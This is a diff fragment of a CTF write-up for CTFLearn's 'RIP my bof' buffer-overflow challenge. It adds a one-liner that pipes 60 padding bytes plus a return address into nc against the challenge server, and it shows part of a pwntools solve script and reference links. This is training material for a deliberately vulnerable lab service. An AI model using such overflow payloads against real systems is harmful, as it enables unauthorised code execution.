@@ -78,7 +78,12 @@ while True:
 	print(sock.recvline().decode("utf-8"))
 ```
 
+or
 
+```
+$ python -c 'print ("A" * 60) + "\x86\x85\x04\x08"' | nc thekidofarcrania.com 4902
+
+```
 
 
 C:\Python\python.exe "D:\Project_2024\CTFLearn\solutions\binary\RIP my bof\run.py" 
@@ -112,3 +117,6 @@ https://github.com/RasyidMF/ctf-writeup/tree/master/CTF%20Learn/Easy/RIP%20my%20
 https://github.com/RutraSan/ctflearn/blob/main/RIP%20my%20bof.md 
 
 (We can also pack as big endian using `endian='big'` parameter in packing functions. If the binary is 32 bits, then we use `p32()`. It converts the address to 32 bits/4 bytes)
+
+
+https://7rocky.github.io/en/ctf/ctflearn/binary/rip-my-bof/
